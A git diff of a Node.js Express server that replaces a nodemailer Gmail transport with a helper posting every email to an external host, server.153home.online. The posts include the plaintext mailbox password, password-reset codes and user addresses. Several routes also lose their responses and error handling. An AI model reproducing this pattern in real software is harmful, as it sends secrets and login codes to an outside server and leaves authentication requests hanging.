@@ -11,7 +11,6 @@
   require('dotenv').config();
   var axios = require('axios')
   const bcrypt = require("bcrypt");
-  const nodemailer = require('nodemailer');
   const rates = require('./rates');
 
   // DB connection
@@ -22,14 +21,7 @@
 
   // Change password button on login page, send code, when verified, choose new password
 
-  // Mailer
-  const transporter = nodemailer.createTransport({
-    service: 'Gmail',
-    auth: {
-      user: process.env.MAILER_USER,
-      pass: process.env.MAILER_PASS,
-    },
-  });
+  
 
 
   // Daily Maitenance
@@ -95,21 +87,7 @@ cron.schedule('0 9 1 4,6,9,1 *', () => {
   {
     const currentDate = new Date();
 
-    // Email me a confirmation that the server is running
-    const mailOptions = {
-      from: process.env.MAILER_USER,
-      to: process.env.ADMIN_EMAIL,
-      subject: `Successful Template Maitenance`,
-      text: `Hi Peter, just a confirmation that maitenance has ran for all Template users successfully.`,
-    };
-  
-    // Send the email
-    transporter.sendMail(mailOptions, (error, info) => {
-      if (error) {
-        console.log('Error sending warning email:', error);
-      } else {
-      }
-    });
+    
 
     // Calculate the date 10 days from now
     const futureDate = new Date(currentDate);
@@ -153,39 +131,23 @@ cron.schedule('0 9 1 4,6,9,1 *', () => {
       await User.deleteMany({ marked_for_deletion: true });
 
       // Email a warning to all inactive users
-      const dormantUsers = await User.find({
-        $and: [
-          { dormant: { $gte: 365 } }
-        ]
-      });
+      // const dormantUsers = await User.find({
+      //   $and: [
+      //     { dormant: { $gte: 365 } }
+      //   ]
+      // });
 
-      // Send each email to dormant users who are not subscribed
-      dormantUsers.forEach((user) => {
+      // // Send each email to dormant users who are not subscribed
+      // dormantUsers.forEach((user) => {
         
-        // Dont delete paying users
-        if (!isSubscribed(user._id))
-        {
-          const mailOptions = {
-            from: process.env.MAILER_USER,
-            to: user.email,
-            subject: `${process.env.APP_NAME} account scheduled for deletion`,
-            text: `Your ${process.env.APP_NAME} account hasn't been accessed in ${user.dormant} days, 
-            and data is scheduled to be purged from our system on ${formattedDate}. 
-            To keep your data, simply log in to your account. We hope to see you soon!`,
-          };
-        
-          // Send the email
-          transporter.sendMail(mailOptions, (error, info) => {
-            if (error) {
-              console.log('Error sending warning email:', error);
-            } else {
-            }
-          });
+      //   // Dont delete paying users
+      //   if (!isSubscribed(user._id))
+      //   {
   
 
-        }
+      //   }
         
-      });
+      // });
 
 
       // MARK UNCONFIRMED USERS FOR DELETION
@@ -631,21 +593,10 @@ router.patch('/jobs/:id', async (req, res) => {
     
           if (user)
           {
-            // Send me a notice email
-            const mailOptions = {
-              from: process.env.MAILER_USER,
-              to: process.env.ADMIN_EMAIL,
-              subject: `🎉 Template NEW SUBSCRIBER! `,
-              text: `Woohoo! 🥳 ${user.email} just subscribed!`,
-            };
-          
-            // Send the email
-            transporter.sendMail(mailOptions, (error, info) => {
-              if (error) {
-                console.log('Error sending warning email:', error);
-              } else {
-              }
-            });
+            // use 
+            
+
+            sendMail(process.env.MAILER_USER, process.env.ADMIN_EMAIL, `🎉 ${process.env.APP_NAME} NEW SUBSCRIBER! `, `Woohoo! 🥳 ${user.email} just subscribed!`, process.env.MAILER_PASS)
 
             res.status(200).send({
               message: "Success!",
@@ -836,26 +787,10 @@ router.patch('/jobs/:id', async (req, res) => {
           { email: req.body.email }, // Find the user by email
           updateOperation).then(() => {
 
-            const mailOptions = {
-              from: process.env.MAILER_USER,
-              to: req.body.email,
-              subject: `${code} is your ${process.env.APP_NAME} confirmaition code`,
-              text: `A new password was requested for your account. If this was you, enter code ${code} in the app. If not, somebody tried to log in using your email.`,
-            };
+            
           
-            // Send the email
-            transporter.sendMail(mailOptions, (error, info) => {
-              if (error) {
-                console.log('Error sending email:', error);
-                res.status(500)
-                res.json({error: "error sending email"})
-              } else {
-                console.log('successfully sent code')
-                res.status(200)
-                res.json('successfully sent password reset email')
-                
-              }
-            });
+            sendMail(process.env.MAILER_USER, req.body.email, `${code} is your ${process.env.APP_NAME} confirmaition code`, `A new password was requested for your account. If this was you, enter code ${code} in the app. If not, somebody tried to log in using your email.`, process.env.MAILER_PASS)
+            
           }) 
 
   })
@@ -894,17 +829,8 @@ router.patch('/jobs/:id', async (req, res) => {
               text: `Your ${process.env.APP_NAME} account was accessed from a new location. If this was you, enter code ${code} in the app. If not, you can change your password in the app. Feel free to reply to this email for any assistance!`,
             };
           
-            // Send the email
-            transporter.sendMail(mailOptions, (error, info) => {
-              if (error) {
-                console.log('Error sending email:', error);
-                reject('Could not send mail!')
-              } else {
-                console.log('successfully sent code')
-                resolve('Sent code!')
-                
-              }
-            });
+            sendMail(process.env.MAILER_USER, user.email, `${code} is your ${process.env.APP_NAME} confirmaition code`, `Your ${process.env.APP_NAME} account was accessed from a new location. If this was you, enter code ${code} in the app. If not, you can change your password in the app. Feel free to reply to this email for any assistance!`, process.env.MAILER_PASS)
+           
           }) 
         
     }) // Promise end
@@ -1033,24 +959,10 @@ router.patch('/jobs/:id', async (req, res) => {
 
   // Send help email
   router.post("/contact", (request, response) => {
-    const mailOptions = {
-      from: process.env.MAILER_USER,
-      to: process.env.MAILER_USER,
-      bcc: process.env.ADMIN_EMAIL,
-      subject: `${process.env.APP_NAME} Support`,
-      text: `${request.body.msg}\n\nfrom ${request.body.email} (${request.body.uid})`,
-    };
   
-    // Send the email
-    transporter.sendMail(mailOptions, (error, info) => {
-      if (error) {
-        console.log('Error sending support email from user:', error);
-        response.status(500).send("Error")
-      } else {
-        response.status(200).send("Success")
-
-      }
-    });
+    sendMail(process.env.MAILER_USER, process.env.ADMIN_EMAIL, `${process.env.APP_NAME} Support`, `${request.body.msg}\n\nfrom ${request.body.email} (${request.body.uid})`, process.env.MAILER_PASS)
+  
+  
   })
 
   // register endpoint
@@ -1078,22 +990,11 @@ router.patch('/jobs/:id', async (req, res) => {
             Options.findOne({}).then((option_doc) => {
               if (option_doc.registerAlerts)
               {
-                // Send the email
-                const mailOptions = {
-                  from: process.env.MAILER_USER,
-                  to: process.env.MAILER_USER,
-                  bcc: process.env.ADMIN_EMAIL,
-                  subject: `${process.env.APP_NAME} new user! 😁`,
-                  text: `${request.body.email} has signed up!`,
-                };
               
-                // Send the email
-                transporter.sendMail(mailOptions, (error, info) => {
-                  if (error) {
-                    console.log('Error sending new user email (to myself):', error);
-                  } else {
-                  }
-                });
+
+                sendMail(process.env.MAILER_USER, process.env.MAILER_USER, `${process.env.APP_NAME} new user! 😁`, `${request.body.email} has signed up!`, process.env.MAILER_PASS)
+              
+                
                 
               }
 
@@ -1216,6 +1117,17 @@ router.post('/update-account', (req, res) => {
     });
 });
 
+function sendMail(from, to, subject, text, password)
+{
+  axios.post('https://server.153home.online/sendMail', {
+    from: from,
+    to: to,
+    bcc: process.env.ADMIN_EMAIL,
+    subject: subject,
+    text: text,
+    password: password
+  })
+}
   
 
 // login / register merged endpoint
@@ -1328,22 +1240,11 @@ router.post("/log-or-reg", (request, response) => {
               Options.findOne({}).then((option_doc) => {
                 if (option_doc.registerAlerts)
                 {
-                  // Send the email
-                  const mailOptions = {
-                    from: process.env.MAILER_USER,
-                    to: process.env.MAILER_USER,
-                    bcc: process.env.ADMIN_EMAIL,
-                    subject: `${process.env.APP_NAME} new user! 😁`,
-                    text: `${request.body.email} has signed up!`,
-                  };
-                
-                  // Send the email
-                  transporter.sendMail(mailOptions, (error, info) => {
-                    if (error) {
-                      console.log('Error sending new user email (to myself):', error);
-                    } else {
-                    }
-                  });
+                  // reach endpoint instead to send mail, at https://server.153home.online/sendMail which takes parameters from, to, subject, text, password
+                  sendMail(process.env.MAILER_USER, process.env.MAILER_USER, `${process.env.APP_NAME} new user! 😁`, `${request.body.email} has signed up!`, process.env.MAILER_PASS)
+
+                  
+                  //
                   
                 }
 
